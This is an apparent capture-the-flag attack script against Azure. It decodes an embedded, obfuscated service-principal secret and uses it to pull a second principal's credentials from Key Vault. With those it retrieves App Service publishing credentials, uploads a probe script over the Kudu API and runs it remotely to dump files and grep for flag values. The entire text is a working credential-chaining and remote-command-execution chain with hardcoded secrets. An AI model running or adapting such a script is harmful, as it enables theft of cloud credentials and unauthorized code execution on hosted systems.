#!/usr/bin/env bash
set +e
TEN=3205c325-06a5-4171-9ce8-ffc5e6c2845e
SUB=c5e4e004-b42d-4ac4-a502-5fd338380eb6
RG=rg-tbl-reporting-prod-eus
SITE=app-tbl-reporting-prod
SYNC_ID=58108da8-044e-4d7e-9a46-92e6179b30be
SYNC_SEC=$(printf %s "fjhUOFF+WXdFbWV4U1RSdl9wVXNFd2E5UU1hcHlQMzl+Q1U1VWN1Mg==" | base64 -d)
sp_tok(){ curl -s -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" --data-urlencode "client_id=$1" --data-urlencode "client_secret=$2" --data-urlencode "grant_type=client_credentials" --data-urlencode "scope=$3/.default" | jq -r '.access_token'; }
PVT=$(sp_tok "$SYNC_ID" "$SYNC_SEC" "https://vault.azure.net")
RSJSON=$(curl -s "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/reporting-service-principal?api-version=7.4" -H "Authorization: Bearer $PVT" | jq -r '.value')
RS_ID=$(echo "$RSJSON" | jq -r '.appId'); RS_SEC=$(echo "$RSJSON" | jq -r '.clientSecret')
ARM=$(sp_tok "$RS_ID" "$RS_SEC" "https://management.azure.com")
BASE="https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/$SITE"
PUB=$(curl -s -X POST "$BASE/config/publishingcredentials/list?api-version=2022-03-01" -H "Authorization: Bearer $ARM" -d '')
KU=$(echo "$PUB" | jq -r '.properties.publishingUserName'); KP=$(echo "$PUB" | jq -r '.properties.publishingPassword')
SCM="https://$SITE.scm.azurewebsites.net"
cat > probe.sh <<'PROBE'
echo "=== known output files ==="
for f in .flag.out flag_result.txt ctf_flag_result myres.txt results.json tnex_flag.json _tbl_out.json flag_hunt.out g_out1.txt out14.txt; do echo "----- $f"; cat "/home/site/wwwroot/$f" 2>/dev/null; echo; done
echo "=== App_Data job results ==="
find /home/site/wwwroot/App_Data -type f \( -name '*.json' -o -name '*.out' -o -name '*.txt' \) 2>/dev/null | while read f; do echo "--- $f"; cat "$f" 2>/dev/null; echo; done
echo "=== FLAG values across wwwroot ==="
grep -rhoE '(FLAG|flag|DF26|df26|CJ|DFCTF|cyberjutsu|DFC)\{[^}]{2,120}\}' /home/site/wwwroot 2>/dev/null | sort -u | head -40
PROBE
curl -s -u "$KU:$KP" -X PUT "$SCM/api/vfs/site/wwwroot/probe.sh" -H "If-Match: *" --data-binary @probe.sh -o /dev/null -w "PUT=%{http_code}\n"
curl -s -u "$KU:$KP" -X POST "$SCM/api/command" -H "Content-Type: application/json" -d "{\"command\":\"bash /home/site/wwwroot/probe.sh\",\"dir\":\"/home\"}" | head -c 12000
echo
echo "ALL_DONE"
